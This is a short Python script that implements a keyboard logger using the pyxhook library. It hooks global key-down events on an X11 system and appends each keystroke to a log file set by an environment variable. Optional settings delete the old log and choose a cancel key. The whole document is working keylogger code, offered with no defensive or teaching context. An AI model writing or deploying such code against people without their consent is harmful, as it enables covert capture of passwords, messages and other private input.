import os 
import pyxhook 

log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('......') #path of the file to be stored
) 
cancel_key = ord( 
    os.environ.get( 
        'pylogger_cancel', 
        '`'
    )[0] 
) 
  
  #defining a file for keylogs
if os.environ.get('pylogger_clean', None) is not None: 
    try: 
        os.remove(log_file) 
    except EnvironmentError:  
        pass
  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key)) 
  
# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# set the hook 
new_hook.HookKeyboard() 
try: 
    new_hook.start()    # start the hook 
except KeyboardInterrupt: 
    pass
except Exception as ex: 
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('{}'.format(msg)) 
